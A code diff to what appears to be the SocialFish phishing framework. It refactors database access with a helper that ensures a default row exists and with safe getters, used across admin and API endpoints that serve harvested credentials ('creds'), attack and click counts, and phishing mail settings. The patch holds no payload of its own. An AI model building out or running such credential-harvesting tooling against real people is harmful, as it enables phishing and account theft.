@@ -65,6 +65,31 @@ def teardown_request(exception):
     if hasattr(g, 'db'):
         g.db.close()
 
+# Ensure `socialfish` table has a default row and provide safe getters
+def ensure_socialfish_row(cur):
+    try:
+        cur.execute("""CREATE TABLE IF NOT EXISTS socialfish (
+                                            id integer PRIMARY KEY,
+                                            clicks integer,
+                                            attacks integer,
+                                            token text
+                                        ); """)
+        cur.execute("SELECT id FROM socialfish WHERE id = 1")
+        if cur.fetchone() is None:
+            t = genToken()
+            cur.execute('INSERT INTO socialfish(id,clicks,attacks,token) VALUES(?,?,?,?)', (1, 0, 0, t))
+            g.db.commit()
+    except Exception as e:
+        print(f'[-] ensure_socialfish_row error: {e}')
+
+
+def sf_get(cur, column, default=None):
+    try:
+        row = cur.execute(f"SELECT {column} FROM socialfish where id = 1").fetchone()
+        return row[0] if row and row[0] is not None else default
+    except Exception:
+        return default
+
 # Conta o numero de credenciais salvas no banco
 def countCreds():
     count = 0
@@ -269,9 +294,11 @@ def echo():
 @flask_login.login_required
 def getCreds():
     cur = g.db
-    attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
-    clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    # Ensure the socialfish row exists and get values safely
+    ensure_socialfish_row(cur)
+    attacks = sf_get(cur, 'attacks', 0)
+    clicks = sf_get(cur, 'clicks', 0)
+    tokenapi = sf_get(cur, 'token', '')
     data = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc").fetchall()
     return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)
 
@@ -281,9 +308,11 @@ def getCreds():
 def getMail():
     if request.method == 'GET':
         cur = g.db
-        email = cur.execute("SELECT email FROM sfmail where id = 1").fetchone()[0]
-        smtp = cur.execute("SELECT smtp FROM sfmail where id = 1").fetchone()[0]
-        port = cur.execute("SELECT port FROM sfmail where id = 1").fetchone()[0]
+        row = cur.execute("SELECT email, smtp, port FROM sfmail where id = 1").fetchone()
+        if row:
+            email, smtp, port = row[0], row[1], row[2]
+        else:
+            email, smtp, port = '', '', ''
         return render_template('admin/mail.html', email=email, smtp=smtp, port=port)
     if request.method == 'POST':
         subject = request.form['subject']
@@ -359,7 +388,8 @@ def revokeToken():
         new_token = genToken()
         cur.execute("UPDATE socialfish SET token = ? WHERE id = 1", (new_token,))
         g.db.commit()
-        token = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+        ensure_socialfish_row(cur)
+        token = sf_get(cur, 'token', '')
         genQRCode(token, revoked=True)
     return redirect('/creds')
 
@@ -849,7 +879,8 @@ def unauthorized_handler():
 @app.route("/api/checkKey/<key>", methods=['GET'])
 def checkKey(key):
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
     if key == tokenapi:
         status = {'status':'ok'}
     else:
@@ -859,11 +890,12 @@ def checkKey(key):
 @app.route("/api/statistics/<key>", methods=['GET'])
 def getStatics(key):
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
     if key == tokenapi:
         cur = g.db
-        attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
-        clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
+        attacks = sf_get(cur, 'attacks', 0)
+        clicks = sf_get(cur, 'clicks', 0)
         countC = countCreds()
         countNPU = countNotPickedUp()
         info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}
@@ -874,7 +906,8 @@ def getStatics(key):
 @app.route("/api/getJson/<key>", methods=['GET'])
 def getJson(key):
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
     if key == tokenapi:
         try:
             sql = "SELECT * FROM creds"
@@ -899,7 +932,8 @@ def postConfigureApi():
     if request.is_json:
         content = request.get_json()
         cur = g.db
-        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+        ensure_socialfish_row(cur)
+        tokenapi = sf_get(cur, 'token', '')
         if content.get('key') == tokenapi:
             red = content.get('red', 'https://github.com/UndeadSec/SocialFish')
             beef = content.get('beef', 'no')
@@ -938,7 +972,8 @@ def postSendMail():
     if request.is_json:
         content = request.get_json()
         cur = g.db
-        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+        ensure_socialfish_row(cur)
+        tokenapi = sf_get(cur, 'token', '')
         if content['key'] == tokenapi:
             subject = content['subject']
             email = content['email']
@@ -966,7 +1001,8 @@ def postSendMail():
 def getTraceIpMob(key, ip):
     import re
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
     
     # Validate IP format
     ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
@@ -990,7 +1026,8 @@ def getTraceIpMob(key, ip):
 def getScanSfMob(key, ip):
     import re
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
     
     # Validate IP format
     ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
@@ -1011,7 +1048,8 @@ def getScanSfMob(key, ip):
 @app.route("/api/infoReport/<key>", methods=['GET'])
 def getReportMob(key):
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
     if key == tokenapi:
         urls = cur.execute("SELECT url FROM creds").fetchall()
         users = cur.execute("SELECT name FROM professionals").fetchall()
